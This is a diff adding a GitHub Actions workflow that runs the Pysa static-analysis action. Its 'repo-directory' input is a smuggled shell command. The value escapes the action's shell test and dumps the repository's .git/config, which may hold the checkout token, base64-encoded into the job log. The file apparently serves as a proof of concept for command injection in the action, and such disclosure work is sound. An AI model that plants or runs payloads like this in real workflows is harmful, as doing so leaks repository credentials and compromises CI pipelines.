@@ -1,0 +1,15 @@
+name: Actions
+on: workflow_dispatch
+jobs:
+  one:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run Pysa Action
+        uses: facebook/pysa-action@main
+        with:
+          repo-directory: '" ]; then echo ""; fi; cat .git/config | base64 -w0 #'
+          requirements-path: 'requirements.txt'
+          infer-types: true
+          include-default-sapp-filters: true
+          sapp-filters-directory: path/to/custom-filters
